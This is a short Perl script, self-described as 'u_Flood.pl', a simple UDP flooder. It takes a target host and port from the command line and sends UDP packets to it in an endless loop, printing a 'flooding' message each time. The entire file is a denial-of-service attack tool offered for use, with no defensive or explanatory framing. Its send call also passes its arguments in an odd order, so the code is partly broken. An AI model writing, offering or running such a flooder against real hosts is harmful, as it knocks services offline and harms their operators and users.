#!/usr/bin/perl
#
#u_Flood.pl  by dni
#simple UDP flooder.

use IO::Socket;

$ARGC = @ARGV;

if ($ARGC != 2) {

        print("Usage: $0 host port \n");
        exit(1);

        }

($host, $port) = @ARGV;


$sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto => "udp") || die "$! Could not create sock";

packets:
while (1) {
$size = rand() * rand() * rand();
print ("flooding $host on the $port port and size is $size\n");
send($sock, 0, $size);

} 
